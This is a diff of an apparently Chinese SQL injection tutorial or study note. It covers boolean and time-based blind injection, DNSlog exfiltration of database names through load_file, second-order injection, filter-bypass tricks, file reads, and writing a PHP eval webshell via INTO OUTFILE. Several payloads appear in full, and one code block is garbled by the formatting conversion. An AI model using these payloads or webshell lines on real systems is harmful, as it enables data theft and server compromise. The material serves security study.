+<p>应用界面仅仅返回True（页面）或者False（页面）。无法根据应用程序的返回页面得到需要的数据库信息。可以通过构造逻辑判断（比较大小）来得到需要的信息。</p>
 <p>一般是逐位确认</p>
 <p>1.判断当前数据库名长度与数据库名称</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">select</span> length(database())<span class="operator">&gt;</span>n <span class="operator">/</span><span class="operator">/</span>判断数据库名长度</span><br><span class="line"><span class="keyword">and</span> ascii(substr(database(),m,<span class="number">1</span>))<span class="operator">&gt;</span>n <span class="operator">/</span><span class="operator">/</span>截取数据库名第m个字符并转换成ascii码 判断具体值</span><br></pre></td></tr></table></figure>
-
 <p>2.判断数据库的表长度与表名</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> length((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;dvwa&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>))<span class="operator">&gt;</span>n <span class="operator">/</span><span class="operator">/</span>判断第一行表名的长度</span><br><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;dvwa&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),m,<span class="number">1</span>))<span class="operator">&gt;</span>n <span class="operator">/</span><span class="operator">/</span>截取第一行表名的第m个字符串转换为ascii值判断具体为多少</span><br></pre></td></tr></table></figure>
-
 <p>3.判断数据库的字段名长度与字段名称</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> length((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>))<span class="operator">&gt;</span>n <span class="operator">/</span><span class="operator">/</span>判断表名中字段名的长度</span><br><span class="line"><span class="keyword">and</span> ascii((substr(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),m,<span class="number">1</span>))<span class="operator">&gt;</span>n <span class="operator">/</span><span class="operator">/</span>截取表中字段的第m字符串转换为ascii值，判断具体值</span><br></pre></td></tr></table></figure>
-
 <p>4.判断字段的内容长度与内容字符串</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> length((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>)) <span class="operator">&gt;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>判断字符串内容长度</span><br><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),m,<span class="number">1</span>)) <span class="operator">/</span><span class="operator">/</span>截取第m个字符串转换为ascii值</span><br></pre></td></tr></table></figure>
-
 <p>类似的还有函数<code>left() right() if() hex()</code></p>
-<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>和bool盲注类似，只不过是在验证阶段有所不同，bool盲注是根据页面回显的不同来判断的，而时间盲注是根据页面响应时间来判断结果的，常用的函数有：</p>
-<h6 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h6><p>常搭配if():</p>
+<h4 id="时间盲注">时间盲注</h4>
+<p>和bool盲注类似，只不过是在验证阶段有所不同，bool盲注是根据页面回显的不同来判断的，而时间盲注是根据页面响应时间来判断结果的，常用的函数有：</p>
+<h6 id="sleep">sleep()</h6>
+<p>常搭配if():</p>
 <ul>
-<li>if（expr1，expr2，expr3） 如果expr1为真，则if函数执行expr2语句，否则if函数执行expr3语句</li>
+<li>if（expr1，expr2，expr3）
+如果expr1为真，则if函数执行expr2语句，否则if函数执行expr3语句</li>
 </ul>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">where</span> uer_id<span class="operator">=</span><span class="number">1</span> and1<span class="operator">=</span>if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
-
-<p>此处 如果条件<code>ascii(substr(database(),1,1))&gt;1</code>成立则执行<code>sleep（5）</code>，否则执行1</p>
+<p>此处
+如果条件<code>ascii(substr(database(),1,1))&gt;1</code>成立则执行<code>sleep（5）</code>，否则执行1</p>
 <p>枚举当前数据库名</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and sleep(3) and ascii(substr(database(),m,1))&gt;n --+</span></span><br></pre></td></tr></table></figure>
-
 <p>枚举当前数据库的表名</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit a,1),m,1))&gt;n and sleep(3) --+</span></span><br></pre></td></tr></table></figure>
-
 <p>或者利用if函数</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit a,1),m,1)) &gt;n,sleep(5),1) --+</span></span><br></pre></td></tr></table></figure>
-
 <p>枚举当前数据库表的字段名</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit a,1),m,1))&gt;n and sleep(3) --+</span></span><br></pre></td></tr></table></figure>
-
 <p>枚举每个字段对应的数据项内容</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select username from security.users limit a,1),m,1))&gt;n and sleep(3) --+</span></span><br></pre></td></tr></table></figure>
-
-<h6 id="benchmark"><a href="#benchmark" class="headerlink" title="benchmark()"></a>benchmark()</h6><p>benchmark(N,expression):N为执行的次数，expression为表达式，比如计算哈希函数MD5，将MD5函数重复次数执行数万次则可以达到延迟的效果</p>
-<h4 id="dnslog注入："><a href="#dnslog注入：" class="headerlink" title="dnslog注入："></a>dnslog注入：</h4><p>简单理解就是在利用注入漏洞的时候，页面无回显，无法直接获得回显信息的情况下，目标可以发起DNS请求，这时就可以尝试通过DNSlog注入的方式把想获得的数据外带出来。 对于SQL盲注，我们可以通过布尔或者时间盲注获取内容，但是整个过程效率低，需要发送很多的请求进行判断，容易触发安全设备的防护，Dnslog盲注可以减少发送的请求，直接回显数据实现注入。</p>
-<p>注入主要用到了<code>Load_file</code>函数，功能是读取文件并返回文件内容为字符串。(访问互联网中的文件时，需要在最前面加上两个斜杠 &#x2F;&#x2F;)</p>
+<h6 id="benchmark">benchmark()</h6>
+<p>benchmark(N,expression):N为执行的次数，expression为表达式，比如计算哈希函数MD5，将MD5函数重复次数执行数万次则可以达到延迟的效果</p>
+<h4 id="dnslog注入">dnslog注入：</h4>
+<p>简单理解就是在利用注入漏洞的时候，页面无回显，无法直接获得回显信息的情况下，目标可以发起DNS请求，这时就可以尝试通过DNSlog注入的方式把想获得的数据外带出来。
+对于SQL盲注，我们可以通过布尔或者时间盲注获取内容，但是整个过程效率低，需要发送很多的请求进行判断，容易触发安全设备的防护，Dnslog盲注可以减少发送的请求，直接回显数据实现注入。</p>
+<p>注入主要用到了<code>Load_file</code>函数，功能是读取文件并返回文件内容为字符串。(访问互联网中的文件时，需要在最前面加上两个斜杠
+//)</p>
 <p>使用本函数有几个前提：</p>
-<ol>
-<li><p>首先要有注入点</p>
-</li>
-<li><p>需要有root权限</p>
-</li>
-<li><p>数据库有读写权限即：secure_file_priv&#x3D;“”</p>
-</li>
-<li><p>得有请求url权限</p>
-</li>
-<li><p>还必须得是windows服务器</p>
-</li>
+<ol type="1">
+<li><p>首先要有注入点</p></li>
+<li><p>需要有root权限</p></li>
+<li><p>数据库有读写权限即：secure_file_priv=“”</p></li>
+<li><p>得有请求url权限</p></li>
+<li><p>还必须得是windows服务器</p></li>
 </ol>
 <p>比如这段：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(concat(<span class="string">&#x27;//&#x27;</span>,(<span class="keyword">select</span> database()),<span class="string">&#x27;.je5i3a.dnslog.cn/1.txt&#x27;</span>));</span><br></pre></td></tr></table></figure>
-
 <p>首先分析concat，concat作用是组合字符串，后面三个内容会组合到一起，<code>select database()</code>会查询到数据库的名称和后面的域名组合到一起，由于组合后相当于是后面域名的子域名，所以会像后面域名请求该域名，后面的域名的服务器就会就会得到dns请求，就可以得到前面的database</p>
-<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p><strong>攻击者构造的恶意数据存储在数据库</strong>后，<strong>恶意数据被读取并进入到SQL查询语句</strong>所导致的注入</p>
+<h4 id="宽字节注入">宽字节注入</h4>
+<h4 id="二次注入">二次注入</h4>
+<p><strong>攻击者构造的恶意数据存储在数据库</strong>后，<strong>恶意数据被读取并进入到SQL查询语句</strong>所导致的注入</p>
 <p>两次注入分别是<strong>插入恶意数据</strong>、<strong>利用恶意数据</strong></p>
 <p>看到一个比较简单的例子（比书上的例子好理解www）：</p>
 <ul>
-<li>题目场景如下：某网站实现了登录，注册，修改密码功能，我们先进行注册，注册用户名为admin’#，接着修改密码，修改密码需要前密码，猜测sql语句为：<code>update users set password=&#39;$new_pass&#39; where username=&#39;$user&#39; and password=&#39;$old_pass&#39;;</code>，由于我们的username&#x3D;admin，则该语句变成：<code>update users set password=&#39;$new_pass&#39; where username=&#39;admin&#39;#&#39; and password=&#39;$old_pass&#39;;</code>，#号后面的都被注释了</li>
+<li>题目场景如下：某网站实现了登录，注册，修改密码功能，我们先进行注册，注册用户名为admin'#，接着修改密码，修改密码需要前密码，猜测sql语句为：<code>update users set password='$new_pass' where username='$user' and password='$old_pass';</code>，由于我们的username=admin，则该语句变成：<code>update users set password='$new_pass' where username='admin'#' and password='$old_pass';</code>，#号后面的都被注释了</li>
 </ul>
 <p>书上的例子：存在用户的登录和注册界面，登录之后可以修改头像，经测试发现只有登录之后会有bool盲注，根据返回长度大小可以判断我们输入的信息是否正确，因此尝试注册不同的用户名，用户名包含bool盲注，如果测试信息成功则说明判断正确</p>
 <p>总体思路：写一个脚本，先用随机的pos和payload_chr进行注册，然后登陆界面根据返回长度判断信息是否正确，如果正确则继续注入</p>
 <p>(返回第一个数据库)：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=<span class="string">&#x27;zaaa\&#x27;/**/and/**/ascii(substr((select/**/(schema_name)/**/from/**/information_schema.schemata/**/0,1),%d,1))=%d/**/and/**/\&#x27;1\&#x27;=\&#x27;1&#x27;</span>%(pos,<span class="built_in">ord</span>(payload_chr))</span><br></pre></td></tr></table></figure>
-
-<p>两个%d对应着pos和后面的ord位置，ord()返回对应的 ASCII 数值，pos是针对该数据库名的某一个位置，payload_chr是该数据库某一个位置的ascii码，进行比较，bool盲注，获取返回数据，书上的例子中如果返回正确长度会大于700</p>
-<h4 id="limit之后的注入"><a href="#limit之后的注入" class="headerlink" title="limit之后的注入"></a>limit之后的注入</h4><h5 id="简单介绍limit："><a href="#简单介绍limit：" class="headerlink" title="简单介绍limit："></a>简单介绍limit：</h5><p>使用查询语句的时候，经常要使用limit返回前几条或者中间某几行数据</p>
+<p>两个%d对应着pos和后面的ord位置，ord()返回对应的 ASCII
+数值，pos是针对该数据库名的某一个位置，payload_chr是该数据库某一个位置的ascii码，进行比较，bool盲注，获取返回数据，书上的例子中如果返回正确长度会大于700</p>
+<h4 id="limit之后的注入">limit之后的注入</h4>
+<h5 id="简单介绍limit">简单介绍limit：</h5>
+<p>使用查询语句的时候，经常要使用limit返回前几条或者中间某几行数据</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">table</span> LIMIT [<span class="keyword">offset</span>,]</span><br></pre></td></tr></table></figure>
-
-<p>LIMIT 子句可以被用于强制 SELECT 语句返回指定的记录数。接受一个或两个数字参数。参数必须是一个整数常量。如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目。<code>LIMIT n</code> 等价于 <code>LIMIT(0,n)</code>,初始记录行的偏移量是 0(而不是 1),比如：</p>
+<p>LIMIT 子句可以被用于强制 SELECT
+语句返回指定的记录数。接受一个或两个数字参数。参数必须是一个整数常量。如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目。<code>LIMIT n</code>
+等价于 <code>LIMIT(0,n)</code>,初始记录行的偏移量是 0(而不是
+1),比如：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">table</span> LIMIT <span class="number">5</span>,<span class="number">10</span>;#检索记录行?<span class="number">6</span><span class="number">-15</span>，从<span class="number">5</span><span class="operator">+</span><span class="number">1</span>开始算</span><br></pre></td></tr></table></figure>
-
-<p>在上面的bool盲注或者时间盲注中，猜第二个字段把limit 0,1改为limit 1,1  猜第三个字段把limit 0,1改为limit 2,1</p>
-<h5 id="limit注入"><a href="#limit注入" class="headerlink" title="limit注入"></a>limit注入</h5><p><strong><u>此方法适用于MySQL 5.x中，在limit语句后面的注入</u></strong></p>
+<p>在上面的bool盲注或者时间盲注中，猜第二个字段把limit 0,1改为limit 1,1
+猜第三个字段把limit 0,1改为limit 2,1</p>
+<h5 id="limit注入">limit注入</h5>
+<p><strong><u>此方法适用于MySQL
+5.x中，在limit语句后面的注入</u></strong></p>
 <p>eg:利用数据库的响应时间来判断数据库的版本号是否是 5 开头:</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">&gt;</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> id limit <span class="number">1</span>,<span class="number">1</span> <span class="keyword">procedure</span> analyse((<span class="keyword">select</span> extractvalue(rand(),concat(<span class="number">0x3a</span>,(IF(MID(version(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">like</span> <span class="number">5</span>,BENCHMARK(<span class="number">5000000</span>,SHA1(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
-
-<p><code>select * from users where id&gt;1 order by id limit 1,1</code>：这是一个正常的 SQL 查询语句，它从 users 表中选择所有的列，其中 id 大于 1，并按照 id 升序排序，只返回第二行的结果。</p>
-<p><code>procedure analyse((select ...),1)</code>：这是一个 MySQL 的内置函数，它可以分析一个结果集中每一列的数据类型和最优的索引类型，并返回一个新的结果集。它接受两个参数，第一个参数是一个结果集，第二个参数是一个数字，表示要分析的列数。在这里，第一个参数是一个子查询，第二个参数是 1，表示只分析第一列。</p>
-<p><code>select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) like 5,BENCHMARK(5000000,SHA1(1)),1))))</code>：这是一个子查询，它会随机生成一个 XML 文档，并从中提取出一个值。它可以分为以下几个部分：</p>
+<p><code>select * from users where id&gt;1 order by id limit 1,1</code>：这是一个正常的
+SQL 查询语句，它从 users 表中选择所有的列，其中 id 大于 1，并按照 id
+升序排序，只返回第二行的结果。</p>
+<p><code>procedure analyse((select ...),1)</code>：这是一个 MySQL
+的内置函数，它可以分析一个结果集中每一列的数据类型和最优的索引类型，并返回一个新的结果集。它接受两个参数，第一个参数是一个结果集，第二个参数是一个数字，表示要分析的列数。在这里，第一个参数是一个子查询，第二个参数是
+1，表示只分析第一列。</p>
+<p><code>select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) like 5,BENCHMARK(5000000,SHA1(1)),1))))</code>：这是一个子查询，它会随机生成一个
+XML 文档，并从中提取出一个值。它可以分为以下几个部分：</p>
 <ul>
-<li><p>extractvalue(rand(),concat(…))：这是一个 XML 解析函数，它会从一个 XML 文档中提取出一个值，并返回该值。它接受以下两个参数：</p>
+<li><p>extractvalue(rand(),concat(...))：这是一个 XML
+解析函数，它会从一个 XML
+文档中提取出一个值，并返回该值。它接受以下两个参数：</p>
 <ul>
-<li><p><code>rand()</code>：这是一个 MySQL 的内置函数，它会返回一个 0 到 1 之间的随机数。作为 XML 文档的根节点。</p>
-</li>
-<li><p><code>concat(0x3a,(IF(MID(version(),1,1) like 5,BENCHMARK(5000000,SHA1(1)),1)))</code>：这是一个字符串拼接函数，它会将多个字符串连接起来，并返回一个新的字符串。作为 XML 文档的子节点。它接受以下几个参数：</p>
+<li><p><code>rand()</code>：这是一个 MySQL 的内置函数，它会返回一个 0 到
+1 之间的随机数。作为 XML 文档的根节点。</p></li>
+<li><p><code>concat(0x3a,(IF(MID(version(),1,1) like 5,BENCHMARK(5000000,SHA1(1)),1)))</code>：这是一个字符串拼接函数，它会将多个字符串连接起来，并返回一个新的字符串。作为
+XML 文档的子节点。它接受以下几个参数：</p>
 <ul>
-<li><code>0x3a</code>：这是一个十六进制数，表示冒号（:）字符。<ul>
-<li><code>IF(MID(version(),1,1) like 5,BENCHMARK(5000000,SHA1(1)),1)</code>：这是一个条件判断函数，它会根据一个条件返回两个不同的值。它接受以下几个参数：<ul>
-<li><code>MID(version(),1,1) like 5</code>：这是一个字符串匹配函数，它会检查数据库的版本号（version()）的第一个字符是否等于 5。</li>
-<li><code>BENCHMARK(5000000,SHA1(1))</code>：这是一个耗时操作，它会对 1 进行 5000000 次 SHA1 哈希运算，并返回运算次数。</li>
-<li>如果条件成立（版本号以 5 开头），那么返回 BENCHMARK 的结果（5000000）；如果条件不成立（版本号不以 5 开头），那么返回 1。</li>
+<li><code>0x3a</code>：这是一个十六进制数，表示冒号（:）字符。
+<ul>
+<li><code>IF(MID(version(),1,1) like 5,BENCHMARK(5000000,SHA1(1)),1)</code>：这是一个条件判断函数，它会根据一个条件返回两个不同的值。它接受以下几个参数：
+<ul>
+<li><code>MID(version(),1,1) like 5</code>：这是一个字符串匹配函数，它会检查数据库的版本号（version()）的第一个字符是否等于
+5。</li>
+<li><code>BENCHMARK(5000000,SHA1(1))</code>：这是一个耗时操作，它会对 1
+进行 5000000 次 SHA1 哈希运算，并返回运算次数。</li>
+<li>如果条件成立（版本号以 5 开头），那么返回 BENCHMARK
+的结果（5000000）；如果条件不成立（版本号不以 5 开头），那么返回
+1。</li>
+</ul></li>
+</ul></li>
+</ul></li>
+</ul></li>
 </ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="注入点的位置及发现"><a href="#注入点的位置及发现" class="headerlink" title="注入点的位置及发现"></a>注入点的位置及发现</h4><h5 id="常见的注入点位置"><a href="#常见的注入点位置" class="headerlink" title="常见的注入点位置"></a>常见的注入点位置</h5><h6 id="GET参数中的注入"><a href="#GET参数中的注入" class="headerlink" title="GET参数中的注入"></a>GET参数中的注入</h6><p>可用sqlmap或者手工注入验证</p>
-<h6 id="POST中的注入"><a href="#POST中的注入" class="headerlink" title="POST中的注入"></a>POST中的注入</h6><p>一般需要结合burpsuite抓包，可用sqlmap or 手工注入</p>
-<h6 id="User-Agent中的注入"><a href="#User-Agent中的注入" class="headerlink" title="User-Agent中的注入"></a>User-Agent中的注入</h6><p>burp的repeater或者sqlmap(level&#x3D;3)</p>
-<h6 id="Cookies中的注入"><a href="#Cookies中的注入" class="headerlink" title="Cookies中的注入"></a>Cookies中的注入</h6><p>burp的repeater或者sqlmap(level&#x3D;2)</p>
-<h5 id="判断注入点是否存在"><a href="#判断注入点是否存在" class="headerlink" title="判断注入点是否存在"></a>判断注入点是否存在</h5><ul>
-<li><p>插入单引号</p>
-</li>
+<h4 id="注入点的位置及发现">注入点的位置及发现</h4>
+<h5 id="常见的注入点位置">常见的注入点位置</h5>
+<h6 id="get参数中的注入">GET参数中的注入</h6>
+<p>可用sqlmap或者手工注入验证</p>
+<h6 id="post中的注入">POST中的注入</h6>
+<p>一般需要结合burpsuite抓包，可用sqlmap or 手工注入</p>
+<h6 id="user-agent中的注入">User-Agent中的注入</h6>
+<p>burp的repeater或者sqlmap(level=3)</p>
+<h6 id="cookies中的注入">Cookies中的注入</h6>
+<p>burp的repeater或者sqlmap(level=2)</p>
+<h5 id="判断注入点是否存在">判断注入点是否存在</h5>
+<ul>
+<li><p>插入单引号</p></li>
 <li><p>数字型判断</p>
-<p>通过<code>and 1=1</code>（数字型）和<code>&#39;and &#39;1&#39;=&#39;1</code>（字符型）</p>
-</li>
+<p>通过<code>and 1=1</code>（数字型）和<code>'and '1'='1</code>（字符型）</p></li>
 <li><p>通过数字的加减进行判断</p>
-<p>?id&#x3D;3-1</p>
-</li>
+<p>?id=3-1</p></li>
 </ul>
-<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/devil8123665/article/details/108746947">绕过总结</a></p>
-<h5 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h5><ul>
-<li>若没有进行递归过滤，可以使用穿插关键字方法进行绕过<ul>
+<h4 id="绕过">绕过</h4>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/devil8123665/article/details/108746947">绕过总结</a></p>
+<h5 id="过滤关键字">过滤关键字</h5>
+<ul>
+<li>若没有进行递归过滤，可以使用穿插关键字方法进行绕过
+<ul>
 <li>eg：select——selselectect</li>
 <li>or——oorr</li>
-</ul>
-</li>
-<li>大小写绕过<ul>
+</ul></li>
+<li>大小写绕过
+<ul>
 <li>eg：select——SeleCt</li>
 <li>or——Or</li>
-</ul>
-</li>
-<li>有些时候过滤函数是通过16进制进行过滤的，可以对关键字的个别字母进行替换<ul>
-<li>eg：select——selec\x74</li>
-</ul>
-</li>
-<li>通过双重url编码进行绕过<ul>
+</ul></li>
+<li>有些时候过滤函数是通过16进制进行过滤的，可以对关键字的个别字母进行替换
+<ul>
+<li>eg：select——selec</li>
+</ul></li>
+<li>通过双重url编码进行绕过
+<ul>
 <li>from——%25%36%36%25%36%66%25%37%32%25%36%64</li>
-</ul>
-</li>
+</ul></li>
 <li>……</li>
 </ul>
-<h5 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h5><ul>
+<h5 id="过滤空格">过滤空格</h5>
+<ul>
 <li><p>通过注释绕过</p>
 <ul>
-<li>eg:#  –  &#x2F;&#x2F;  &#x2F;**&#x2F;  ;%00</li>
-</ul>
-</li>
+<li>eg:# -- // /**/ ;%00</li>
+</ul></li>
 <li><p>通过url编码绕过，我们知道空格的编码是%20，可以通过二次url编码绕过</p>
 <ul>
-<li>%20  ——  %2520</li>
-</ul>
-</li>
+<li>%20 —— %2520</li>
+</ul></li>
 <li><p>通过空白字符绕过</p>
 <ul>
 <li>eg：用换行符替代空格</li>
-</ul>
-</li>
+</ul></li>
 <li><p>通过特殊符号（如反引号、加号等）</p>
 <ul>
-<li><pre><code class="sql">select`user`,`password`from
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    在不同的场景下，加号减号感叹号也会有同样的效果</span><br><span class="line"></span><br><span class="line">+ 科学计数法绕过</span><br><span class="line"></span><br><span class="line">  + ```sql</span><br><span class="line">    select user,password from users where user_id=0e1union select 1,2</span><br></pre></td></tr></table></figure>
-</code></pre>
-</li>
+<li>``<code>sql   select</code>user<code>,</code>password`from
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    在不同的场景下，加号减号感叹号也会有同样的效果</span><br><span class="line"></span><br><span class="line">+ 科学计数法绕过</span><br><span class="line"></span><br><span class="line">  + ```sql</span><br><span class="line">    select user,password from users where user_id=0e1union select 1,2</span><br></pre></td></tr></table></figure></li>
+</ul></li>
 </ul>
-</li>
-</ul>
-<h5 id="过滤单引号"><a href="#过滤单引号" class="headerlink" title="过滤单引号"></a>过滤单引号</h5><h5 id="绕过相等过滤"><a href="#绕过相等过滤" class="headerlink" title="绕过相等过滤"></a>绕过相等过滤</h5><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;/*!UnIoN*/SeLeCT1,2,concat(/*!table_name*/) FrOM/*information_schema*/.tables/*!WHERE*//*!TaBlE_ScHeMa*/like database()#</span></span><br></pre></td></tr></table></figure>
-
-<p>  <code>/*!UnIoN*/</code>：这是一个 MySQL 的注释符号，它表示注释掉中间的内容。但是如果中间的内容是一个 MySQL 的关键字（如 UNION ），那么它会被执行。这样做的目的是绕过一些对 UNION 关键字的过滤或防护机制</p>
-<p> <code>/*! ... */</code>：这是一个条件注释符号，它表示如果中间的内容是一个 MySQL 的关键字（如 UNION ），那么它会被执行；如果中间的内容不是一个 MySQL 的关键字（如 table_name ），那么它会被忽略。这样做的目的是绕过一些对 MySQL 关键字的过滤或防护机制，或者兼容不同版本的 MySQL 。</p>
-<h4 id="sql读写文件"><a href="#sql读写文件" class="headerlink" title="sql读写文件"></a>sql读写文件</h4><p>sql读文件：eg：</p>
+<h5 id="过滤单引号">过滤单引号</h5>
+<h5 id="绕过相等过滤">绕过相等过滤</h5>
+<h5 id="分析">分析</h5>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;/*!UnIoN*/SeLeCT1,2,concat(/*!table_name*/) FrOM/*information_schema*/.tables/*!WHERE*//*!TaBlE_ScHeMa*/like database()#</span></span><br></pre></td></tr></table></figure>
+<p><code>/*!UnIoN*/</code>：这是一个 MySQL
+的注释符号，它表示注释掉中间的内容。但是如果中间的内容是一个 MySQL
+的关键字（如 UNION ），那么它会被执行。这样做的目的是绕过一些对 UNION
+关键字的过滤或防护机制</p>
+<p><code>/*! ... */</code>：这是一个条件注释符号，它表示如果中间的内容是一个
+MySQL 的关键字（如 UNION ），那么它会被执行；如果中间的内容不是一个
+MySQL 的关键字（如 table_name
+），那么它会被忽略。这样做的目的是绕过一些对 MySQL
+关键字的过滤或防护机制，或者兼容不同版本的 MySQL 。</p>
+<h4 id="sql读写文件">sql读写文件</h4>
+<p>sql读文件：eg：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> load_file(<span class="string">&#x27;/etc/host&#x27;</span>)</span><br><span class="line">如果要绕过单引号：</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> load_file(<span class="number">0x2f6574632f686f737473</span>)</span><br></pre></td></tr></table></figure>
-
 <p>sql写文件：eg：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_POST[233]);?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/var/www/html/shell.php&#x27;</span></span><br></pre></td></tr></table></figure>
-
 <p>或者</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> unhex(一句话的shell) <span class="keyword">into</span> dumpfile <span class="string">&#x27;/var/www/html/shell.php&#x27;</span></span><br></pre></td></tr></table></figure>
-
